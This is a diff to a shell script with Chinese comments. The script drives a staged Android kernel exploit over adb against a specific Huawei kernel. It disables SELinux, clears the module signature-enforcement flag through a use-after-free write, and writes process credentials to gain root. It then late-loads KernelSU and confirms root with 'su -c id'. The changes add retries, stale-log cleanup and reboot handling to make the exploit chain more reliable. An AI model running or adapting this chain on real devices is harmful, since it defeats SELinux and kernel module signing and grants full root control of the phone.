@@ -39,6 +39,20 @@ ksu_loaded() {
 }
 
 E="/data/local/tmp/e"
+# su 是否真的可用（late-load 成功的唯一硬判据；不看 getenforce，也不看
+# chain_status —— 它们都可能是别的 boot 留下的）。
+verify_su() {
+  local out="" i
+  for i in 1 2 3 4; do
+    out=$($T30 adb shell "su -c id" 2>/dev/null | tr -d '\r')
+    case "$out" in
+      uid=0*) echo "=== SU OK: $out ==="; return 0 ;;
+    esac
+    sleep 5
+  done
+  echo "=== ROOT-NO-KSU: su unusable (last='$out') ==="
+  return 1
+}
 # 8.0.0.202（5.4.289-qgki-gc5b795a0f72f）：第二次 W1 会重跑 slab_drain，fork 风暴
 # 触发内核保护性重启（2026-11-10 真机两次复现）。该内核默认只跑 1 次，
 # 需要复现时显式 `GL_W1_ATTEMPTS=2 run_w2.sh`。
@@ -50,6 +64,33 @@ case "$KREL" in
 esac
 [ -n "$KREL" ] && echo "[*] kernel: $KREL (GL_W1_ATTEMPTS=$W1_ATTEMPTS)"
 SYNC="GL_AIM_DM=1 GL_W1_ATTEMPTS=$W1_ATTEMPTS GL_ROUTE_ATTEMPTS=1 GL_HOLD_CHAIN=1 GL_HOLD_WAITER=1 GL_PUNCH_IN_WINDOW=1 GL_PUNCH_DELAY_USEC=0 GL_MCAST_ROUTE=1 GL_PROBE_BOOTID=0 GL_SPRAY_TEST=0 GL_STAMP_SYNC=1"
+# 追加旋钮（2026-11-12）：例如 GL_EXTRA="GL_DRAIN_WAVES=1 GL_DRAIN_BATCH=64"，
+# 用来把 W1b 的 fork 风暴压小，避免设备在 sig_enforce 写之前保护性重启。
+EXTRA="${GL_EXTRA:-}"
+
+# 2026-11-12 真机结论（FNE-AN00 8.0.0.202 / 5.4.289-gc5b795a0f72f）：
+#   sig_enforce 每次开机默认是 Y（不是 N！——23:11 那次能过 gate 1 是赶上已被清掉的
+#   boot）。chain_hook 的 gate 1 要求它是 N，而该参数 sysfs 只读，只能用 W1b 的
+#   UAF 写清零。所以：W1 阶段先跳过 W1b（只要 Permissive，快且稳），等 Permissive
+#   之后**单独串行**补一轮 W1b（见下面 "W1b gate" 段），再起 W2。
+#   W1b 每轮先 slab_drain（默认 5 波 x 400 fork），与 W2 并发 = 保护性重启；
+#   单独跑时用 GL_DRAIN_WAVES=1 GL_DRAIN_BATCH=64 把风暴压到最小。
+#   ⇒ 该内核 W1 阶段默认 GL_SKIP_W1B=1；要强制 W1b 就绪可显式 GL_W1B=1。
+SKIP_W1B="${GL_W1B:-0}"
+case "$KREL" in
+  *gc5b795a0f72f*) [ -z "${GL_W1B:-}" ] && SKIP_W1B=1 ;;
+esac
+if [ "$SKIP_W1B" = "1" ]; then
+  SYNC="$SYNC GL_SKIP_W1B=1"
+  echo "[*] W1b skipped (GL_SKIP_W1B=1): sig_enforce is already N on this kernel"
+fi
+
+# 跨 boot 残留是假成功的根源（2026-11-12 实测：11-10 的 gl_w2.log 让 driver
+# 读到 "child is root!" 而实际 W2 从未启动）。每轮 TRY 开始前清干净。
+clean_device_state() {
+  $T30 adb shell "rm -f /data/local/tmp/gl_w1.log /data/local/tmp/gl_w2.log \
+    /data/local/tmp/ksu_fne/chain_status /data/local/tmp/ksu_fne/chain.log" >/dev/null 2>&1
+}
 
 run_to() { # $1=secs $2=logfile $3...=command
   # 实时显示：子进程输出直接写日志文件，本函数按行号增量读取回显。
@@ -102,8 +143,23 @@ run_to() { # $1=secs $2=logfile $3...=command
 #   - 等日志安静下来再起 W2，避开「W1b fork 风暴还没跑完就叠 W2」的竞争。
 detach_start() { # $1=设备端日志 $2...=设备端命令
   local rlog=$1; shift
+  # 2026-11-12: 设备正在自重启/离线时, 下面两条 adb shell 都会静默失败,
+  # 旧日志(可能是上一次成功 boot 的)留在设备上, detach_wait 照样把它读回来
+  # -> 误报 "child is root!" / "KSU LOADED" 的假成功。这里必须确认:
+  #   1) 旧日志已删除; 2) 本轮日志真的被创建。否则返回非 0 让调用方跳过本轮。
   $T30 adb shell "rm -f $rlog" >/dev/null 2>&1
+  if $T30 adb shell "test -e $rlog" >/dev/null 2>&1; then
+    echo "!! detach_start: stale device log $rlog could not be removed (device busy?)"
+    return 1
+  fi
   $T30 adb shell "nohup $* > $rlog 2>&1 < /dev/null &" >/dev/null 2>&1
+  local di=0
+  while [ "$di" -lt 10 ]; do
+    if $T30 adb shell "test -f $rlog" >/dev/null 2>&1; then return 0; fi
+    di=$((di+1)); sleep 1
+  done
+  echo "!! detach_start: device log $rlog was not created (launch failed)"
+  return 1
 }
 
 detach_wait() { # $1=秒 $2=设备端日志 $3=本地日志 $4=安静多久算完成 $5=硬结束标志 ; $6..=成功标志
@@ -177,6 +233,7 @@ for try in 1 2 3 4 5 6 7 8; do
     exit 0
   fi
   settle
+  clean_device_state
   # 本 TRY 起始 boot_id: 识别 W1/W2 期间设备是否已自行重启(exploit
   # 崩溃触发保护性重启, rc=255)。已自重启的设备即新鲜 Enforcing 态,
   # 脚本无须再 reboot 一次(295 无线用户实测 w1 rc=255 后二次重启
@@ -186,7 +243,11 @@ for try in 1 2 3 4 5 6 7 8; do
   echo "=== TRY $try ADJ=$ADJ $(date +%T) getenforce=$en ==="
   if [ "$en" != "Permissive" ]; then
     echo "--- [W1] 关闭 SELinux (--write1, detached), 最长 420s, TRY $try ---"
-    detach_start /data/local/tmp/gl_w1.log env $SYNC $E --write1
+    if ! detach_start /data/local/tmp/gl_w1.log env $SYNC $EXTRA $E --write1; then
+      echo "TRY $try: W1 launch failed (device busy/offline) - rebooting"
+      $T30 adb reboot; sleep 45; $T600 adb wait-for-device; sleep 25
+      continue
+    fi
     # 与 harness 对齐：一看到 SELinux DISABLED 就往下走，不等 W1b（sig_enforce）
     # 收尾 —— harness 3/5 成功用的就是这条时序；这里若等「安静 20s」会把 W2
     # 推到 W1b 之后，实测两次都在 W1b 的第二次 slab_drain 上 panic。
@@ -228,29 +289,76 @@ for try in 1 2 3 4 5 6 7 8; do
   # Permissive now: capture previous boot's panic via pstore/ramoops
   $T30 adb shell "ls /sys/fs/pstore/ 2>/dev/null" > "pstore_try$try.log" 2>&1
   $T30 adb shell "for f in /sys/fs/pstore/*; do echo \"=== \$f\"; cat \"\$f\" 2>/dev/null; done" >> "pstore_try$try.log" 2>&1
+
+  # --- W1b gate: chain_hook 的 gate 1 要求 sig_enforce=N，而该参数是
+  # module_param(bool_enable_only, 0444)（sysfs 只读），唯一清零手段就是
+  # W1b 的 UAF 写。这台机器每次开机默认是 Y ⇒ 不能无条件跳过 W1b，
+  # 否则 W2 拿到 root 也会被 chain 判 sigfail（2026-11-12 23:37 实测）。
+  # W1b 必须单独串行跑：和 W2 并发 = 保护性重启。
+  sv=$($T30 adb shell "cat /sys/module/module/parameters/sig_enforce 2>/dev/null" 2>/dev/null | tr -d '\r\n')
+  echo "TRY $try: sig_enforce=$sv"
+  case "$sv" in
+    N|0) : ;;
+    *)
+      echo "TRY $try: running W1b alone to clear sig_enforce"
+      $T30 adb shell "rm -f /data/local/tmp/gl_w1b.log" >/dev/null 2>&1
+      $T30 adb shell "nohup env $SYNC GL_SKIP_W1B=0 GL_W1B_ATTEMPTS=3 GL_DRAIN_WAVES=1 GL_DRAIN_BATCH=64 $E --write1 > /data/local/tmp/gl_w1b.log 2>&1 < /dev/null &" >/dev/null 2>&1
+      w1bi=0
+      while [ $w1bi -lt 48 ]; do
+        sleep 5; w1bi=$((w1bi+1))
+        if $T30 adb shell "grep -q 'SIG_ENFORCE DISABLED' /data/local/tmp/gl_w1b.log" 2>/dev/null; then break; fi
+      done
+      $T30 adb shell "cat /data/local/tmp/gl_w1b.log" > "w1b_try$try.log" 2>&1
+      sv=$($T30 adb shell "cat /sys/module/module/parameters/sig_enforce 2>/dev/null" 2>/dev/null | tr -d '\r\n')
+      echo "TRY $try: after W1b sig_enforce=$sv"
+      case "$sv" in
+        N|0) : ;;
+        *) echo "TRY $try: W1b failed to clear sig_enforce - reboot"
+           $T30 adb reboot; sleep 45; $T600 adb wait-for-device; sleep 25; continue ;;
+      esac
+      ;;
+  esac
   # Up to 3 W2 invocations on this permissive boot: a clean miss leaves the
   # device permissive (free retry — the 02:48 miss -> 02:52 success path);
   # only a crash (device lost) or success ends the boot early.
-  # harness 时序：Permissive 出现后约 15s 再起 W2（那时 W1b 的 sig_enforce 已写完，
-  # 又不至于等到下次 slab_drain 与 W2 重叠）。
-  sleep 15
+# W1 命中后 ghost waiter 已 park，但 adbd/USB 常有瞬断；2026-11-12 真机配方是
+# 「等 W1 完全静默 + 再等 20s」才起 W2（15s 时偶发与 W1 收尾重叠）。
+  sleep 20
   w2n=0
   w2done=0
   while [ $w2n -lt 3 ]; do
     w2n=$((w2n+1))
     echo "--- [W2] cred 写入 (rounds=2 ADJ=$ADJ), 第 ${w2n}/3 次, 最长 900s ---"
-    detach_start /data/local/tmp/gl_w2.log env $SYNC GL_W2_ROUNDS=2 GL_W2_CRED_ADJ=$ADJ $E
+    if ! detach_start /data/local/tmp/gl_w2.log env $SYNC $EXTRA GL_W2_ROUNDS=2 GL_W2_CRED_ADJ=$ADJ $E; then
+      echo "W2 launch failed (device busy/offline) - aborting this boot"
+      break
+    fi
     # W2 命中 "child is root"/KSU 后日志还会再跑 ~25s 的 KSU 链，等它安静 10s 再收。
     detach_wait 900 /data/local/tmp/gl_w2.log "w2_try${try}_${w2n}.log" 10 "" \
       "child is root" "KSU LOADED" "KernelSU helper reports ready" "child uid = 2000" "erase_ran=1"
     echo "w2 attempt $w2n last: $(tail -2 w2_try${try}_${w2n}.log | tr '\n' ' ')"
     if grep -q "child is root" "w2_try${try}_${w2n}.log"; then
       echo "=== W2 ROOT ACHIEVED TRY $try ==="
-      w2done=1
-      break
+      # child is root 之后 chain_hook 还要跑 fake kallsyms + insmod（约 20-30s）。
+      # 等 chain_status=ok 或 /proc/modules 出现 kernelsu，再用 su -c id 做硬判据。
+      # chain_status 跨 boot 会残留（本 TRY 开头已删），所以只看本轮写入的。
+      echo "--- waiting for KernelSU late-load (up to 180s) ---"
+      ci=0
+      while [ "$ci" -lt 36 ]; do
+        cs=$($T30 adb shell "cat /data/local/tmp/ksu_fne/chain_status 2>/dev/null" 2>/dev/null | tr -d '\r')
+        [ "$cs" = "ok" ] && { echo "--- chain_status=ok ---"; break; }
+        if $T30 adb shell "grep -q kernelsu /proc/modules" 2>/dev/null; then
+          echo "--- kernelsu present in /proc/modules ---"; break
+        fi
+        ci=$((ci+1)); sleep 5
+      done
+      if verify_su; then exit 0; fi
+      echo "=== SU MISSING after root (KSU chain did not complete) ==="
+      exit 3
     fi
     if grep -qE "KernelSU helper reports ready|KSU LOADED" "w2_try${try}_${w2n}.log"; then
       echo "=== KSU READY TRY $try ==="
+      if verify_su; then exit 0; fi
       w2done=1
       break
     fi
@@ -278,4 +386,4 @@ for try in 1 2 3 4 5 6 7 8; do
     $T30 adb reboot; sleep 45; $T600 adb wait-for-device; sleep 25
   fi
 done
-echo "=== FINAL getenforce=$($T30 adb shell getenforce 2>/dev/null | tr -d '\r') kernelsu_modules=$($T30 adb shell 'grep -c kernelsu /proc/modules 2>/dev/null' | tr -d '\r') ==="
+echo "=== FINAL getenforce=$($T30 adb shell getenforce 2>/dev/null | tr -d '\r') kernelsu_modules=$($T30 adb shell 'grep -c kernelsu /proc/modules 2>/dev/null' | tr -d '\r') su=$($T30 adb shell 'su -c id' 2>/dev/null | tr -d '\r') ==="
